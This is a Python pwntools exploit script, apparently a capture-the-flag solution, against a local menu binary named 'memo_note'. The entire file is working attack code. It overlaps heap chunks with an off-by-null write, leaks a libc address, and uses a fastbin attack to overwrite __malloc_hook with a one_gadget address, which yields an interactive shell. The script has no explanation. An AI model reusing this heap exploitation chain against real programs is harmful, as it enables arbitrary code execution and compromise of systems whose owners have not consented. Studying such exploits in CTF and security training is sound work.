from pwn import *

context.log_level='debug'

def new(size, payload):
	p.recvuntil('choice: ')
	p.sendline('1')
	p.recvuntil('size: ')
	p.sendline(str(size))
	p.recvuntil('memo: ')
	p.sendline(payload)


def show(idx):
	p.recvuntil('choice: ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil('choice: ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(idx))


p=process('./memo_note')
p.recvuntil('name: ')
p.sendline(p64(0xdeedbeef))


new(0x90, 'A'*0x90)
new(0x68, 'B'*0x68)
new(0xf0, 'C'*0xf0)
new(0x10, 'D'*0x10)
delete(0)
delete(1)
new(0x68,'B'*0x60+'\x10\x01'.ljust(8,'\x00'))

delete(2)
new(0x90,'a'*0x8f)
show(0)

main_arena=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x58
success(hex(main_arena))

gdb.attach(p,'b *0x555555554f41')
#fastbin attack
delete(1)
new(0xa0, 'E'*0x98 + p64(0x70))# avoid double free
delete(1)

delete(0)

malloc_hook=main_arena-0x23-0x10
new(0xa8,'E'*0x90+p64(0) + p64(0x70) + p64(malloc_hook))
new(0x68, 'A'*0x68)

one_gadget=main_arena-0x3c4b20+0xf1147
new(0x68, 'A'*19 + p64(one_gadget))

p.sendline('1')
p.sendline('16')
p.interactive()
